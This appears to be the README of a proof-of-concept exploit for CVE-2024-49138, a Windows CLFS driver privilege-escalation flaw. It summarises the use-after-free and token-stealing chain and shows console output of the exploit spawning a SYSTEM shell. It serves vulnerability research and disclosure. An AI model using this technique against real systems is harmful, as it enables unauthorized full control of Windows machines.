# CVE-2024-49138

**Title:** Windows Common Log File System Driver Elevation of Privilege Vulnerability  
**CVE-2024-49138:** https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49138  
**Vulnerability Type:** Heap-based Buffer Overflow  
**Tested On:** clfs.sys - 10.0.22621.4391  

## Description

CVE-2024-49138 is a privilege escalation vulnerability in the Windows Common Log File System (CLFS) driver (`clfs.sys`). The flaw exists in the handling of metadata blocks during log file operations. Specifically, when writing a general metadata block, the system encodes sector signatures using `ClfsEncodeBlock()` and subsequently verifies them with `ClfsDecodeBlock()`. By carefully crafting a malicious log container, an attacker can cause the signature array to overlap with sector footers and manipulate the update sequence number (`USN`), leading to signature mismatch. This causes `ClfsDecodeBlock()` to fail, triggering `ReleaseMetadataBlock()` to free the associated memory. However, higher-level logic assumes the metadata block is still valid, resulting in a use-after-free. By creating a controlled object in userland at a predictable address, the attacker can hijack a function pointer call, redirecting execution to a kernel gadget that performs an arbitrary memory write, ultimately achieving SYSTEM-level privileges.

## Exploit

Tested on: Windows 11 22H2 (11-2024 Build)

```
PS C:\Users\h4x\Desktop> .\CVE-2024-49138.exe .\mylogdddd.blf.blf
[+] Successfully created C:\temp\testlog directory!
[+] Log file path: LOG:C:\temp\testlog\mylogdddd.blf
[+] Successfully created the log file!
[+] Container file path: C:\temp\testlog\container1
[+] Successfully created the container!
[+] Successfully overwritten the legitimate BLF file with malicious BLF file
[+] NT base address fffff8023a000000
[+] Found EPROCESS of the current process FFFFAD0885E870C0
[+] Found EPROCESS of the system.exe FFFFAD08800B5040
[+] Found KTHREAD of the current thread FFFFAD088461A080
[+] Fake CClfsContainer = 0x2100000
[+] CreateLogFile failed with error 6601, this is good!
[+] Stealing system's Token..
[+] Replacing KTHREAD.PreviousMode as UserMode..
[+] Spawning shell as SYSTEM...
Microsoft Windows [Version 10.0.22631.4460]
(c) Microsoft Corporation. All rights reserved.

C:\Users\h4x\Desktop>whoami
nt authority\system
```

## Acknowledgements

- It was explained by Alessandro Iandoli and can be found [here](https://security.humanativaspa.it/cve-2024-49138-windows-clfs-heap-based-buffer-overflow-analysis-part-1/).
- The [PoC](https://github.com/MrAle98/CVE-2024-49138-POC) was developed by Alessandro Iandoli, and the above PoC is based on it.
